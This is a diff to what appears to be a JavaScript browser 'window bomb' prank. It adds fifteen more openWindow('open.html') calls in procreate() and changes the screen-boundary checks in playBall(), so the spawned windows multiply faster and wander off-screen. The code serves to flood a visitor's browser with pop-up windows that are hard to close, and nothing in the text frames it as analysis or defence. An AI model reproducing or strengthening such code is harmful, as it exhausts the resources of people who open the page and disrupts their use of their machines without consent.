@@ -15,6 +15,21 @@ function procreate(){
 		openWindow('open.html');
 		openWindow('open.html');
 		openWindow('open.html');
+		openWindow('open.html');		
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');		
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');		
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
+		openWindow('open.html');
 		openWindow('open.html');
 		}
 
@@ -40,13 +55,13 @@ function fOff(){
 function playBall(){
         xPos += xOff;
         yPos += yOff;
-        if (xPos > screen.width-175){
+        if (xPos > screen.width-1705){
         newXlt();
         }
         if (xPos < 0){
         newXrt();
         }
-        if (yPos > screen.height-100){
+        if (yPos > screen.height-1000){
         newYup();
         }
         if (yPos < 0){
